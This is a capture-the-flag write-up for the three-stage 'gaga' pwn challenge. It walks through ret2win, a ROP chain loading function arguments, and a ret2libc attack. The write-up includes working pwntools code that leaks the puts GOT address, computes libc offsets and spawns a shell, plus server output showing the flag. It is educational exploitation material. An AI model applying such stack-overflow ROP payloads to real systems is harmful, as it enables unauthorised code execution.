# Gaga
`64-bits Binary` `ret2win` `calling convention` `ret2libc`
<br>
<br>

This challenge consist of 3 stages, `gaga0 - gaga1 - gaga2`, however I find it funny because I thought `gaga0` will give the first flag, `gaga1` will give the 2nd, and the final part will be given upon finishing the `gaga2`, but actually it'll give you the full flag once you finished `gaga2`, regardless I create the solve for everything :smile:

We can see that all the binary is a 64-bits binary when we run the checksec function, and all gaga has the same security running which

```
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

Now for the `gaga0` is just a simple `ret2win`, we can find the offset with gdb, using the command `pattern create`, then run the binary and input the pattern we've created there, of course it'll return as Segmentation Fault, now we run `pattern offset $rsp` and thus we find the offset of 72. Don't forget to get the win0 function and we have the exploit.

:warning: Because the flag is only partial I won't show the code here, but you can see it in [gaga0.py](./gaga0.py)


Next up is the `gaga1`, when you decompile the binary it has the `win1` function, but you need 2 parameter to get your flag, the offset is the same as before, but we need to use `pop rdi` and `pop rsi` in order to satisfy the requirement.

:warning: Because the flas is only partial, you can see the exploit.py by yourself [here](./gaga1.py)

Finally we get to the main part of the challenge, the `gaga2`. This is a `ret2libc` challenge, where we need to spawn a shell with a got of our selection. The first part is to leak the got with a `puts plt` that we have there.

```python
leaker = b'a'*72
leaker+= p64(pop_rdi)
leaker+= p64(elf.got.puts)
leaker+= p64(elf.plt.puts)
leaker+= p64(elf.symbols.main)

p.sendline(leaker)

puts = u64(p.recvline().replace(b'\n',b'').ljust(8,b'\0'))
log.info(f'Puts : {hex(puts)}')
libc_addr = puts - 0x84420
log.info(f'Libc Addr : {hex(libc_addr)}')
```

using this script, we can get the `puts got` and with that we can calculate the `libc base` by running it on the nc and then find the libc on [libc.blukat.me](https://libc.blukat.me/), which we found `libc6_2.31-0ubuntu9.9_amd64` as the libc that's running on the server. (I found the correct one after some trial and error)

Now we can calculate all the address we need like system, bin_sh using the libc that we found.

```python
pop_rdi = 0x4012b3
system = libc_addr + 0x52290
binsh = libc_addr + 0x1b45bd
ret =0x000000000040101a

log.info(f'pop rdi : {hex(pop_rdi)}')
log.info(f'system : {hex(system)}')
log.info(f'bin_sh : {hex(binsh)}')
log.info(f'ret : {hex(ret)}')
```

Once we have everything prepared, we can preapre our next exploit to finally spawn the shell on the server, and of course to be safe we gonna use stack alignment

```python
payload = b'a'*72
payload+= p64(pop_rdi)
payload+= p64(binsh)
payload+= p64(ret)
payload+= p64(system)

p.sendline(payload)


p.interactive()
```

You can see the full script that I run to the server [here](./gaga2.py), and the result.

```r
[*] '/home/kiinzu/Downloads/gaga2'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[*] Loaded 14 cached gadgets for './gaga2'
[*] '/home/kiinzu/Downloads/libc6_2.31-0ubuntu9.9_amd64.so'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Opening connection to challs.actf.co on port 31302: Done
b"Awesome! Now there's no system(), so what will you do?!\nYour input: "
[*] Puts : 0x7f37334fa420
[*] Libc Addr : 0x7f3733476000
[*] pop rdi : 0x4012b3
[*] system : 0x7f37334c8290
[*] bin_sh : 0x7f373362a5bd
[*] ret : 0x40101a
[*] Switching to interactive mode
$ ls
flag.txt
run
$ cat flag.txt
actf{b4by's_f1rst_pwn!_3857ffd6bfdf775e}
```